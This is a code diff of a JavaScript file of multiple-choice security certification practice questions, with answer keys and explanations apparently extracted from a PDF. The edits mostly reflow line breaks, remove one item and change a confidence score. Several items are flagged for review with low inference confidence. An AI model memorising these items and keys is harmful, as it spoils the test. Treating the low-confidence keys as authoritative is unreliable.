-    "explanation": "Firewall and network logs are the most efficient sources for identifying large outbound data\ntransfers, as they record all traffic leaving the network. By examining these logs for significant\ndata flows to unfamiliar or external IP addresses or domains, the security team can determine\nwhere the data was exfiltrated and potentially identify the destination of the exfiltrated data. This\napproach directly targets the incident's key indicators: large data transfer and external\ncommunication.",
+    "explanation": "Firewall and network logs are the most efficient sources for identifying large outbound data transfers, as they record all traffic leaving the network. By examining these logs for significant data flows to unfamiliar or external IP addresses or domains, the security team can determine where the data was exfiltrated and potentially identify the destination of the exfiltrated data. This approach directly targets the incident's key indicators: large data transfer and external communication.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2111,7 +2111,7 @@ export const domain4Questions = [
     "objective": "4.2",
     "objectiveTitle": "Explain the security implications of proper hardware, software, and data asset management",
     "type": "single",
-    "question": "A legal department must maintain a backup from all devices that have been shredded and\nrecycled by a third party.\nWhich of the following best describes this requirement?",
+    "question": "A legal department must maintain a backup from all devices that have been shredded and recycled by a third party.\nWhich of the following best describes this requirement?",
     "choices": [
       {
         "key": "A",
@@ -2133,7 +2133,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Data retention refers to the practice of keeping copies or backups of data for a specific period,\neven after the original devices have been disposed of or destroyed. In this case, the legal\ndepartment requires a backup to be maintained from devices that have been shredded and\nrecycled, ensuring that necessary data is preserved in compliance with legal or regulatory\nrequirements.",
+    "explanation": "Data retention refers to the practice of keeping copies or backups of data for a specific period, even after the original devices have been disposed of or destroyed. In this case, the legal department requires a backup to be maintained from devices that have been shredded and recycled, ensuring that necessary data is preserved in compliance with legal or regulatory requirements.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2171,7 +2171,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Scanning email traffic inline enables the security solution to inspect attachments and other\ncontent in real-time as emails are received. This allows the system to detect and block malicious\nattachments before they reach employees, effectively preventing potential security incidents\ncaused by harmful email attachments. This approach is essential for identifying and neutralizing\nthreats within email content directly.",
+    "explanation": "Scanning email traffic inline enables the security solution to inspect attachments and other content in real-time as emails are received. This allows the system to detect and block malicious attachments before they reach employees, effectively preventing potential security incidents caused by harmful email attachments. This approach is essential for identifying and neutralizing threats within email content directly.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2209,7 +2209,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Detection is the first stage in the incident response process. It involves identifying potential\nsecurity incidents through alerts, monitoring, and analysis to determine if an incident has\noccurred. Effective detection is crucial as it initiates the response process, allowing the team to\nassess the situation and proceed with containment and other response steps.",
+    "explanation": "Detection is the first stage in the incident response process. It involves identifying potential security incidents through alerts, monitoring, and analysis to determine if an incident has occurred. Effective detection is crucial as it initiates the response process, allowing the team to assess the situation and proceed with containment and other response steps.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2225,7 +2225,7 @@ export const domain4Questions = [
     "objective": "4.7",
     "objectiveTitle": "Explain the importance of automation and orchestration related to secure operations",
     "type": "single",
-    "question": "Which of the following is the main consideration when a legacy system that is a critical part of a\ncompany's infrastructure cannot be replaced?",
+    "question": "Which of the following is the main consideration when a legacy system that is a critical part of a company's infrastructure cannot be replaced?",
     "choices": [
       {
         "key": "A",
@@ -2247,7 +2247,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "When a legacy system that is critical to a company's infrastructure cannot be replaced, the\nprimary consideration is that it may become a single point of failure. This is because legacy\nsystems are often difficult to support, lack redundancy, and may no longer receive updates,\nmaking them vulnerable. Ensuring that this critical system is protected from failure is essential to\nmaintain continuity and reduce the risk of operational disruptions.",
+    "explanation": "When a legacy system that is critical to a company's infrastructure cannot be replaced, the primary consideration is that it may become a single point of failure. This is because legacy systems are often difficult to support, lack redundancy, and may no longer receive updates, making them vulnerable. Ensuring that this critical system is protected from failure is essential to maintain continuity and reduce the risk of operational disruptions.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2294,7 +2294,7 @@ export const domain4Questions = [
       "A",
       "B"
     ],
-    "explanation": "In a Corporate-Owned, Personally-Enabled (COPE) mobile device management policy, the\norganization provides devices that employees can use for both work and personal purposes.\nRemote wiping ensures that the organization can remove sensitive data if the device is lost,\nstolen, or if the employee leaves the organization. Data encryption protects sensitive data on\nthe device, ensuring security for both corporate and personal use. These controls are essential\nfor securing organizational data on devices used in a COPE model.",
+    "explanation": "In a Corporate-Owned, Personally-Enabled (COPE) mobile device management policy, the organization provides devices that employees can use for both work and personal purposes.\nRemote wiping ensures that the organization can remove sensitive data if the device is lost, stolen, or if the employee leaves the organization. Data encryption protects sensitive data on the device, ensuring security for both corporate and personal use. These controls are essential for securing organizational data on devices used in a COPE model.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2310,7 +2310,7 @@ export const domain4Questions = [
     "objective": "4.2",
     "objectiveTitle": "Explain the security implications of proper hardware, software, and data asset management",
     "type": "single",
-    "question": "Which of the following techniques can be used to sanitize the data contained on a hard drive\nwhile allowing for the hard drive to be repurposed?",
+    "question": "Which of the following techniques can be used to sanitize the data contained on a hard drive while allowing for the hard drive to be repurposed?",
     "choices": [
       {
         "key": "A",
@@ -2332,7 +2332,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "A wipe tool can be used to securely erase all data on a hard drive without physically damaging\nit, making it suitable for repurposing. Wiping overwrites the data on the drive multiple times,\nensuring that previously stored information cannot be recovered. This approach allows the hard\ndrive to be reused safely, as opposed to degaussing or physical destruction, which renders the\ndrive unusable.",
+    "explanation": "A wipe tool can be used to securely erase all data on a hard drive without physically damaging it, making it suitable for repurposing. Wiping overwrites the data on the drive multiple times, ensuring that previously stored information cannot be recovered. This approach allows the hard drive to be reused safely, as opposed to degaussing or physical destruction, which renders the drive unusable.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2348,7 +2348,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "A company discovered its data was advertised for sale on the dark web. During the initial\ninvestigation, the company determined the data was proprietary data.\nWhich of the following is the next step the company should take?",
+    "question": "A company discovered its data was advertised for sale on the dark web. During the initial investigation, the company determined the data was proprietary data.\nWhich of the following is the next step the company should take?",
     "choices": [
       {
         "key": "A",
@@ -2386,7 +2386,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following is the primary reason why false negatives on a vulnerability scan should\nbe a concern?",
+    "question": "Which of the following is the primary reason why false negatives on a vulnerability scan should be a concern?",
     "choices": [
       {
         "key": "A",
@@ -2408,7 +2408,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "False negatives in vulnerability scanning occur when the scan fails to detect existing\nvulnerabilities. This is a concern because it means that the system has vulnerabilities, but they\nare not being identified and addressed, leaving the system potentially exposed to exploitation.\nUnlike false positives, which result in wasted time on vulnerabilities that aren't actually present,\nfalse negatives directly impact security by failing to identify real risks.",
+    "explanation": "False negatives in vulnerability scanning occur when the scan fails to detect existing vulnerabilities. This is a concern because it means that the system has vulnerabilities, but they are not being identified and addressed, leaving the system potentially exposed to exploitation.\nUnlike false positives, which result in wasted time on vulnerabilities that aren't actually present, false negatives directly impact security by failing to identify real risks.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2446,7 +2446,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Wiping is the most cost-effective method to decrease the risk of client data theft from\ndecommissioned laptops. Wiping involves using software tools to securely erase all data on the\nhard drive, making it unrecoverable. This ensures that sensitive information cannot be\naccessed, even if the laptop is later reused or disposed of. Compared to shredding (which\ninvolves physical destruction and is more costly) or simple deletion (which does not truly erase\nthe data), wiping is an effective, inexpensive way to mitigate the risk.",
+    "explanation": "Wiping is the most cost-effective method to decrease the risk of client data theft from decommissioned laptops. Wiping involves using software tools to securely erase all data on the hard drive, making it unrecoverable. This ensures that sensitive information cannot be accessed, even if the laptop is later reused or disposed of. Compared to shredding (which involves physical destruction and is more costly) or simple deletion (which does not truly erase the data), wiping is an effective, inexpensive way to mitigate the risk.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2484,7 +2484,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Closing unnecessary service ports is a critical security measure because it helps to reduce the\nsystem's attack surface. Each open port represents a potential entry point for attackers, and if a\nservice is not needed, keeping the associated port open unnecessarily increases the risk of\nexploitation. By closing unused ports, you minimize the number of possible attack vectors,\nmaking it harder for attackers to compromise the system.",
+    "explanation": "Closing unnecessary service ports is a critical security measure because it helps to reduce the system's attack surface. Each open port represents a potential entry point for attackers, and if a service is not needed, keeping the associated port open unnecessarily increases the risk of exploitation. By closing unused ports, you minimize the number of possible attack vectors, making it harder for attackers to compromise the system.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2500,7 +2500,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A security team at a large, global company needs to reduce the cost of storing data used for\nperforming investigations.\nWhich of the following types of data should have its retention length reduced?",
+    "question": "A security team at a large, global company needs to reduce the cost of storing data used for performing investigations.\nWhich of the following types of data should have its retention length reduced?",
     "choices": [
       {
         "key": "A",
@@ -2522,7 +2522,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Packet capture data generally has a high storage cost because it records detailed network\ntraffic and is often voluminous.\nWhile packet capture data is valuable for short-term investigations and troubleshooting, it\ntypically does not need to be retained long-term for most security operations. Reducing its\nretention length can help lower the cost of storing such data.",
+    "explanation": "Packet capture data generally has a high storage cost because it records detailed network traffic and is often voluminous.\nWhile packet capture data is valuable for short-term investigations and troubleshooting, it typically does not need to be retained long-term for most security operations. Reducing its retention length can help lower the cost of storing such data.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2538,7 +2538,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "An organization purchased a critical business application containing sensitive data. The\norganization would like to ensure that the application is not exploited by common data\nexfiltration attacks.\nWhich of the following approaches would best help to fulfill this requirement?",
+    "question": "An organization purchased a critical business application containing sensitive data. The organization would like to ensure that the application is not exploited by common data exfiltration attacks.\nWhich of the following approaches would best help to fulfill this requirement?",
     "choices": [
       {
         "key": "A",
@@ -2560,13 +2560,13 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "A Web Application Firewall (WAF) is specifically designed to protect web applications by filtering\nand monitoring HTTP traffic. It helps prevent common data exfiltration attacks, such as SQL\ninjection, cross-site scripting (XSS), and other web-based threats, by inspecting incoming traffic\nand blocking malicious requests. A WAF would be an effective choice for safeguarding the\nsensitive data in the application and ensuring it is not exploited by attackers attempting data\nexfiltration.",
+    "explanation": "A Web Application Firewall (WAF) is specifically designed to protect web applications by filtering and monitoring HTTP traffic. It helps prevent common data exfiltration attacks, such as SQL injection, cross-site scripting (XSS), and other web-based threats, by inspecting incoming traffic and blocking malicious requests. A WAF would be an effective choice for safeguarding the sensitive data in the application and ensuring it is not exploited by attackers attempting data exfiltration.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
     "source": "SY0-701_en.pdf#p110",
     "needsReview": true,
-    "inferenceConfidence": 0.5,
+    "inferenceConfidence": 0.357,
     "needsExplanation": false,
     "keyCorrected": false
   },
@@ -2576,7 +2576,7 @@ export const domain4Questions = [
     "objective": "4.2",
     "objectiveTitle": "Explain the security implications of proper hardware, software, and data asset management",
     "type": "single",
-    "question": "Which of the following aspects of the data management life cycle is most directly impacted by\nlocal and international regulations?",
+    "question": "Which of the following aspects of the data management life cycle is most directly impacted by local and international regulations?",
     "choices": [
       {
         "key": "A",
@@ -2598,7 +2598,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Data retention refers to the period of time that data must be kept by an organization. Local and\ninternational regulations (such as GDPR, HIPAA, or other data protection laws) often define how\nlong specific types of data must be retained for legal, regulatory, or business purposes. These\nregulations can directly impact how long data should be stored and when it must be deleted or\nanonymized.",
+    "explanation": "Data retention refers to the period of time that data must be kept by an organization. Local and international regulations (such as GDPR, HIPAA, or other data protection laws) often define how long specific types of data must be retained for legal, regulatory, or business purposes. These regulations can directly impact how long data should be stored and when it must be deleted or anonymized.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2609,50 +2609,12 @@ export const domain4Questions = [
     "keyCorrected": false
   },
   {
-    "id": "q0264",
-    "domain": 4,
-    "objective": "4.4",
-    "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
-    "type": "single",
-    "question": "A company captures log-in details and reviews them each week to identify conditions such as\nexcessive log-in attempts and frequent lockouts.\nWhich of the following should a security analyst recommend to improve security compliance\nmonitoring?",
-    "choices": [
-      {
-        "key": "A",
-        "text": "Including the date and person who reviewed the information in a report"
-      },
-      {
-        "key": "B",
-        "text": "Adding automated alerting when anomalies occur"
-      },
-      {
-        "key": "C",
-        "text": "Requiring a statement each week that no exceptions were noted"
-      },
-      {
-        "key": "D",
-        "text": "Masking the username in a report to protect privacy"
-      }
-    ],
-    "correct": [
-      "B"
-    ],
-    "explanation": "Automated alerting when anomalies occur is a crucial recommendation for improving security\ncompliance monitoring. This approach ensures that suspicious activities, such as excessive\nlogin attempts and frequent lockouts, are immediately detected and flagged for further\ninvestigation, reducing the risk of undetected security threats. Automated alerts improve\nresponse times and reduce the need for manual monitoring, enhancing overall security posture.",
-    "explanationSource": "pdf",
-    "incorrectExplanations": {},
-    "references": [],
-    "source": "SY0-701_en.pdf#p119",
-    "needsReview": true,
-    "inferenceConfidence": 0.286,
-    "needsExplanation": false,
-    "keyCorrected": false
-  },
-  {
     "id": "q0268",
     "domain": 4,
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "A company wants to add an MFA solution for all employees who access the corporate network\nremotely. Log-in requirements include something you know, are, and have. The company wants\na solution that does not require purchasing third-party applications or specialized hardware.\nWhich of the following MFA solutions would best meet the company's requirements?",
+    "question": "A company wants to add an MFA solution for all employees who access the corporate network remotely. Log-in requirements include something you know, are, and have. The company wants a solution that does not require purchasing third-party applications or specialized hardware.\nWhich of the following MFA solutions would best meet the company's requirements?",
     "choices": [
       {
         "key": "A",
@@ -2690,7 +2652,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "The management team reports that employees are missing features on company-provided\ntablets, which is causing productivity issues. The management team directs the IT team to\nresolve the issue within 48 hours.\nWhich of the following would be the best solution for the IT team to leverage in this scenario?",
+    "question": "The management team reports that employees are missing features on company-provided tablets, which is causing productivity issues. The management team directs the IT team to resolve the issue within 48 hours.\nWhich of the following would be the best solution for the IT team to leverage in this scenario?",
     "choices": [
       {
         "key": "A",
@@ -2712,7 +2674,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "MDM (Mobile Device Management) is the best solution in this scenario. MDM allows IT teams to\nmanage, configure, and secure mobile devices remotely. It can be used to ensure that\ncompany-provided tablets are properly configured, with all necessary features and updates, and\nto resolve issues such as missing features or software inconsistencies. Additionally, MDM can\nhelp enforce company policies, deploy apps, and track device compliance, making it an efficient\nway to address the problem within the 48-hour time frame.",
+    "explanation": "MDM (Mobile Device Management) is the best solution in this scenario. MDM allows IT teams to manage, configure, and secure mobile devices remotely. It can be used to ensure that company-provided tablets are properly configured, with all necessary features and updates, and to resolve issues such as missing features or software inconsistencies. Additionally, MDM can help enforce company policies, deploy apps, and track device compliance, making it an efficient way to address the problem within the 48-hour time frame.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2728,7 +2690,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "A penetration test has demonstrated that domain administrator accounts were vulnerable to\npass-the-hash attacks.\nWhich of the following would have been the best strategy to prevent the threat actor from using\ndomain administrator accounts?",
+    "question": "A penetration test has demonstrated that domain administrator accounts were vulnerable to pass-the-hash attacks.\nWhich of the following would have been the best strategy to prevent the threat actor from using domain administrator accounts?",
     "choices": [
       {
         "key": "A",
@@ -2750,7 +2712,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "A privileged access management (PAM) solution is the best strategy to prevent the threat actor\nfrom using domain administrator accounts in a pass-the-hash attack. PAM solutions are\ndesigned to secure, control, and monitor the access to critical accounts (like domain\nadministrator accounts) by enforcing least privilege access, ensuring strong authentication\nmethods, and reducing the exposure of credentials. These solutions often include features such\nas vaulting and rotating privileged credentials, which mitigate the risk of pass-the-hash attacks.",
+    "explanation": "A privileged access management (PAM) solution is the best strategy to prevent the threat actor from using domain administrator accounts in a pass-the-hash attack. PAM solutions are designed to secure, control, and monitor the access to critical accounts (like domain administrator accounts) by enforcing least privilege access, ensuring strong authentication methods, and reducing the exposure of credentials. These solutions often include features such as vaulting and rotating privileged credentials, which mitigate the risk of pass-the-hash attacks.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2766,7 +2728,7 @@ export const domain4Questions = [
     "objective": "4.7",
     "objectiveTitle": "Explain the importance of automation and orchestration related to secure operations",
     "type": "single",
-    "question": "An administrator wants to automate an account permissions update for a large number of\naccounts.\nWhich of the following would best accomplish this task?",
+    "question": "An administrator wants to automate an account permissions update for a large number of accounts.\nWhich of the following would best accomplish this task?",
     "choices": [
       {
         "key": "A",
@@ -2804,7 +2766,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following is the fastest and most cost-effective way to confirm a third-party\nsupplier's compliance with security obligations?",
+    "question": "Which of the following is the fastest and most cost-effective way to confirm a third-party supplier's compliance with security obligations?",
     "choices": [
       {
         "key": "A",
@@ -2826,7 +2788,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "An attestation report is the fastest and most cost-effective way to confirm a third-party supplier's\ncompliance with security obligations. An attestation report is a document provided by the third\nparty (or a third-party auditor) that confirms their adherence to specific security frameworks,\npolicies, or regulatory standards. This report is often based on industry standards such as SOC\n2, ISO 27001, or similar certifications, and provides assurance without the need for an in-depth\naudit or testing process.",
+    "explanation": "An attestation report is the fastest and most cost-effective way to confirm a third-party supplier's compliance with security obligations. An attestation report is a document provided by the third party (or a third-party auditor) that confirms their adherence to specific security frameworks, policies, or regulatory standards. This report is often based on industry standards such as SOC 2, ISO 27001, or similar certifications, and provides assurance without the need for an in-depth audit or testing process.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2842,7 +2804,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following types of identification methods can be performed on a deployed\napplication during runtime?",
+    "question": "Which of the following types of identification methods can be performed on a deployed application during runtime?",
     "choices": [
       {
         "key": "A",
@@ -2864,7 +2826,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Dynamic analysis involves evaluating an application while it is running (during runtime) to\nidentify potential vulnerabilities, performance issues, or other security risks. This type of analysis\nallows security professionals to observe the application's behavior in real-world conditions and\nto identify issues that may not be apparent from static code inspection alone.",
+    "explanation": "Dynamic analysis involves evaluating an application while it is running (during runtime) to identify potential vulnerabilities, performance issues, or other security risks. This type of analysis allows security professionals to observe the application's behavior in real-world conditions and to identify issues that may not be apparent from static code inspection alone.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2902,7 +2864,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Static analysis is the method most likely to be used by a security engineer to quickly identify a\nsignature from a known malicious file. In static analysis, the file is examined without being\nexecuted, typically by analyzing its binary or code structure. This allows for the identification of\nknown malicious patterns, signatures, or characteristics within the file, enabling a quick\nassessment of whether the file is malicious.",
+    "explanation": "Static analysis is the method most likely to be used by a security engineer to quickly identify a signature from a known malicious file. In static analysis, the file is examined without being executed, typically by analyzing its binary or code structure. This allows for the identification of known malicious patterns, signatures, or characteristics within the file, enabling a quick assessment of whether the file is malicious.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2918,7 +2880,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "A security engineer at a large company needs to enhance IAM in order to ensure that\nemployees can only access corporate systems during their shifts.\nWhich of the following access controls should the security engineer implement?",
+    "question": "A security engineer at a large company needs to enhance IAM in order to ensure that employees can only access corporate systems during their shifts.\nWhich of the following access controls should the security engineer implement?",
     "choices": [
       {
         "key": "A",
@@ -2940,7 +2902,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Time-of-day restrictions are the most appropriate access control for ensuring that employees\ncan only access corporate systems during their shifts. By setting specific time windows during\nwhich access is allowed (e.g., only during working hours or assigned shifts), the security\nengineer can limit when users are able to log in and access corporate resources.",
+    "explanation": "Time-of-day restrictions are the most appropriate access control for ensuring that employees can only access corporate systems during their shifts. By setting specific time windows during which access is allowed (e.g., only during working hours or assigned shifts), the security engineer can limit when users are able to log in and access corporate resources.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2956,7 +2918,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "A company wants to ensure employees are allowed to copy files from a virtual desktop during\nthe workday but are restricted during non-working hours.\nWhich of the following security measures should the company set up?",
+    "question": "A company wants to ensure employees are allowed to copy files from a virtual desktop during the workday but are restricted during non-working hours.\nWhich of the following security measures should the company set up?",
     "choices": [
       {
         "key": "A",
@@ -2978,7 +2940,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Time-based access control is the most suitable measure for restricting employees from copying\nfiles during non-working hours. It allows access to resources based on the time of day, ensuring\nthat employees can copy files during the workday, but are restricted from doing so outside of\nthose hours. This ensures that the company's policy is enforced based on time-specific criteria.",
+    "explanation": "Time-based access control is the most suitable measure for restricting employees from copying files during non-working hours. It allows access to resources based on the time of day, ensuring that employees can copy files during the workday, but are restricted from doing so outside of those hours. This ensures that the company's policy is enforced based on time-specific criteria.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2994,7 +2956,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A CVE in a key back-end component of an application has been disclosed. The systems\nadministrator is identifying all of the systems in the environment that are susceptible to this risk.\nWhich of the following should the systems administrator perform?",
+    "question": "A CVE in a key back-end component of an application has been disclosed. The systems administrator is identifying all of the systems in the environment that are susceptible to this risk.\nWhich of the following should the systems administrator perform?",
     "choices": [
       {
         "key": "A",
@@ -3016,7 +2978,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "A vulnerability scan is used to identify systems and components in an environment that are\nsusceptible to known vulnerabilities, such as those disclosed through CVEs (Common\nVulnerabilities and Exposures). This process involves scanning systems for software versions\nand configurations to determine if they match the affected criteria of the disclosed vulnerability.\nThis allows the systems administrator to take corrective actions, such as patching or mitigating\nthe vulnerability.",
+    "explanation": "A vulnerability scan is used to identify systems and components in an environment that are susceptible to known vulnerabilities, such as those disclosed through CVEs (Common Vulnerabilities and Exposures). This process involves scanning systems for software versions and configurations to determine if they match the affected criteria of the disclosed vulnerability.\nThis allows the systems administrator to take corrective actions, such as patching or mitigating the vulnerability.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3054,7 +3016,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "The acquisition stage in an investigation involves obtaining forensic images of digital evidence.\nThis process includes creating exact copies of data from storage devices (e.g., hard drives,\nUSB drives) or systems while maintaining the integrity of the original evidence. These forensic\nimages are then used for analysis in subsequent stages of the investigation, ensuring that the\noriginal evidence remains unaltered.",
+    "explanation": "The acquisition stage in an investigation involves obtaining forensic images of digital evidence.\nThis process includes creating exact copies of data from storage devices (e.g., hard drives, USB drives) or systems while maintaining the integrity of the original evidence. These forensic images are then used for analysis in subsequent stages of the investigation, ensuring that the original evidence remains unaltered.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3070,7 +3032,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "A security report shows that during a two-week test period, 80% of employees unwittingly\ndisclosed their SSO credentials when accessing an external website. The organization\npurposely created the website to simulate a cost-free password complexity test.\nWhich of the following would best help reduce the number of visits to similar websites in the\nfuture?",
+    "question": "A security report shows that during a two-week test period, 80% of employees unwittingly disclosed their SSO credentials when accessing an external website. The organization purposely created the website to simulate a cost-free password complexity test.\nWhich of the following would best help reduce the number of visits to similar websites in the future?",
     "choices": [
       {
         "key": "A",
@@ -3092,7 +3054,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "A phishing awareness campaign is the best way to address this issue by educating employees\nabout recognizing and avoiding phishing attempts. The campaign can include training sessions,\nsimulated phishing exercises, and guidelines for safely handling requests for sensitive\ninformation. By increasing awareness and understanding, employees will be less likely to fall for\nsimilar schemes in the future, significantly reducing the risk of credential disclosure.",
+    "explanation": "A phishing awareness campaign is the best way to address this issue by educating employees about recognizing and avoiding phishing attempts. The campaign can include training sessions, simulated phishing exercises, and guidelines for safely handling requests for sensitive information. By increasing awareness and understanding, employees will be less likely to fall for similar schemes in the future, significantly reducing the risk of credential disclosure.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3108,7 +3070,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "A Chief Information Security Officer (CISO) has developed information security policies that\nrelate to the software development methodology.\nWhich of the following would the CISO most likely include in the organization's documentation?",
+    "question": "A Chief Information Security Officer (CISO) has developed information security policies that relate to the software development methodology.\nWhich of the following would the CISO most likely include in the organization's documentation?",
     "choices": [
       {
         "key": "A",
@@ -3130,7 +3092,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Peer review requirements are often included in information security policies related to the\nsoftware development methodology. Peer reviews help ensure that code is reviewed for quality,\nsecurity vulnerabilities, and adherence to best practices before it is merged or deployed. This\nprocess reduces the likelihood of introducing security flaws into the software and aligns with\nsecure development lifecycle practices.",
+    "explanation": "Peer review requirements are often included in information security policies related to the software development methodology. Peer reviews help ensure that code is reviewed for quality, security vulnerabilities, and adherence to best practices before it is merged or deployed. This process reduces the likelihood of introducing security flaws into the software and aligns with secure development lifecycle practices.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3168,7 +3130,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "The Common Vulnerability Scoring System (CVSS) provides a standardized way to assess and\nprioritize the severity of vulnerabilities. By assigning a numerical score to each vulnerability\nbased on factors like exploitability and impact, CVSS helps organizations determine the urgency\nof applying patches, enabling efficient risk management and prioritization of remediation efforts.",
+    "explanation": "The Common Vulnerability Scoring System (CVSS) provides a standardized way to assess and prioritize the severity of vulnerabilities. By assigning a numerical score to each vulnerability based on factors like exploitability and impact, CVSS helps organizations determine the urgency of applying patches, enabling efficient risk management and prioritization of remediation efforts.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3184,7 +3146,7 @@ export const domain4Questions = [
     "objective": "4.7",
     "objectiveTitle": "Explain the importance of automation and orchestration related to secure operations",
     "type": "single",
-    "question": "A systems administrator creates a script that validates OS version, patch levels, and installed\napplications when users log in.\nWhich of the following examples best describes the purpose of this script?",
+    "question": "A systems administrator creates a script that validates OS version, patch levels, and installed applications when users log in.\nWhich of the following examples best describes the purpose of this script?",
     "choices": [
       {
         "key": "A",
@@ -3206,7 +3168,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "The script ensures that systems meet specific requirements such as the OS version, patch\nlevels, and installed applications when users log in. This process is an example of baseline\nenforcement, where a predefined standard or configuration (baseline) is enforced to maintain\nsystem security, compliance, and stability.",
+    "explanation": "The script ensures that systems meet specific requirements such as the OS version, patch levels, and installed applications when users log in. This process is an example of baseline enforcement, where a predefined standard or configuration (baseline) is enforced to maintain system security, compliance, and stability.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3222,7 +3184,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A security analyst learns that an attack vector, which was used as a part of a recent incident,\nwas a well-known IoT device exploit. The analyst needs to review logs to identify the time of\ninitial exploit.\nWhich of the following logs should the analyst review first?",
+    "question": "A security analyst learns that an attack vector, which was used as a part of a recent incident, was a well-known IoT device exploit. The analyst needs to review logs to identify the time of initial exploit.\nWhich of the following logs should the analyst review first?",
     "choices": [
       {
         "key": "A",
@@ -3244,7 +3206,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
